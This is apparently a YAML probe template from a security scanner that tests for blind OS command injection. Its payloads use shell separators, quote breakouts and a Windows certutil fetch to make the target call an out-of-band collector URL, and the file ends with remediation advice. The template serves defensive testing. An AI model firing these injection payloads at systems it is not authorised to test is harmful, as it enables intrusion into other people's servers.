id: cmdi-oob
name: OS Command Injection (blind, OAST-confirmed)
family: cmdi
severity: critical
cwe: CWE-78
owasp: WSTG-INPV-12
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
inject_into: [query, body, json]
payloads:
  # Use {{oast_url}} (carries a unique token in the path) so the callback correlates
  # to this exact probe — works with both Interactsh and the self-hosted collector.
  - ";curl {{oast_url}};"
  - "|curl {{oast_url}}"
  - "$(curl {{oast_url}})"
  - "`curl {{oast_url}}`"
  - "& nslookup {{oast_domain}} &"
# Tried only when the planner marks cmdi a priority for the target. More separators/quote-breakouts and
# Windows variants, so a backend that rejects ;/| or runs cmd.exe still fires. Every one carries the
# unique OAST token, so the SAME out-of-band oracle confirms it — a callback or nothing, zero FP.
intensive_payloads:
  - "%0acurl {{oast_url}}%0a"                                  # newline separator (URL-encoded)
  - "'; curl {{oast_url}} #"                                   # break out of a single-quoted argument
  - "\"; curl {{oast_url}} #"                                  # break out of a double-quoted argument
  - "|| curl {{oast_url}}"                                     # OR: runs when the preceding command fails
  - "&& curl {{oast_url}}"                                     # AND: runs when the preceding command succeeds
  - "& certutil -urlcache -split -f http://{{oast_domain}}/ x &"  # Windows LOLBIN outbound fetch
  - "| ping -n 1 {{oast_domain}}"                              # Windows ping (DNS callback)
oracle:
  type: any_of
  checks:
    - type: oob
confirm_reproducible: false
remediation: >-
  Never pass user input to a shell. Use parameterized process APIs that take an
  argument vector (no shell interpretation), validate against an allowlist, and
  drop shell metacharacters.
